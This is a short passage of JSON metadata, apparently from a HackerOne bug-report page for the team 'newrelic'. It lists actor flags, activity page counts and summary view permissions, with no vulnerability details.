6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}